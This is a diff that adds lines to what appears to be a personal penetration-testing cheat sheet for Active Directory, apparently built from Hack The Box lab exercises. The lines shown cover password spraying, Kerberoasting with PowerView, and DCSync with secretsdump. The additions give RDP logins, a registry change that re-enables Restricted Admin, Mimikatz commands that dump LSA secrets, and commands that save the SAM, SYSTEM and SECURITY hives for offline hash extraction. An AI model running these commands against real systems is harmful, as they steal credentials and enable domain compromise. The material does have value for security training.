@@ -1244,6 +1244,18 @@ PS C:\htb> Get-DomainPolicy
 # Performs a password spraying attack and outputs (-OutFile) the results to a specified file (spray_success) from a Windows-based host.
 PS C:\htb> Import-Module .\DomainPasswordSpray.ps1
 Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
+
+#Login RDP with xfreerdp3
+xfreerdp3 /u:user /p:'NewPass123!' /v:172.16.8.50
+
+#Login RDP with xfreerdp3 in a domain + share folder
+
+xfreerdp3 /u:user /p:'NewPass123!' /v:172.16.8.50 /d:INLANEFREIGHT.LOCAL /drive:shared,/home/Tools /cert:ignore /sec:tls
+
+#if log in is disabled for Admin
+reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f
+
+
 ```
 ##### [Enumerating and Bypassing AV](https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/defense-evasion/disable-defender)
 ```
@@ -1352,7 +1364,8 @@ python2.7 kirbi2john.py sqldev.kirbi
 sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
 
 # Uses PowerView tool to extract TGS Tickets . Performed from a Windows-based host.
-Import-Module .\PowerView.ps1 Get-DomainUser * -spn | select samaccountname
+Import-Module .\PowerView.ps1
+Get-DomainUser * -spn | select samaccountname
 
 # PowerView tool used to download/request the TGS ticket of a specific ticket and automatically format it for Hashcat from a Windows-based host.
 Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
@@ -1408,6 +1421,13 @@ secretsdump.py -just-dc DOMAIN.LOCAL/user:password@DC_IP
 # - Requires replication rights (e.g., Domain Admin, or DS-Replication-Get-Changes* rights)
 # - Output format: user:RID:LM:NTLM:::
 # - Submit NTLM (2nd hash), LM is often aad3b435...
+
+#dump Secrets with Mimikatz
+mimikatz # log
+mimikatz # privilege::debug
+mimikatz # lsadump::secrets (if you see the error ERROR kuhl_m_lsadump_secretsOrCache ; kull_m_registry_RegOpenKeyEx (SECURITY) (0x00000005) then->)
+mimikatz # token::elevate
+mimikatz # lsadump::secrets
 
 ```
 ##### Miscellanous Configurations
@@ -1875,6 +1895,13 @@ get-service | ? {$_.DisplayName -like 'Druva*'}
 ---
 
 ## Credential Theft
+
+#save SAM db and SYSTEM and Security
+reg save HKLM\SYSTEM SYSTEM.SAVE
+reg save HKLM\SECURITY SECURITY.SAVE
+reg save HKLM\SAM SAM.SAVE
+#process with secretsdump.py
+secretsdump.py LOCAL -system SYSTEM.SAVE -sam SAM.SAVE -security SECURITY.SAVE
 
 #Search for files containing the word "password"
 findstr /SIM /C:"password" *.txt *ini *.cfg *.config *.xml
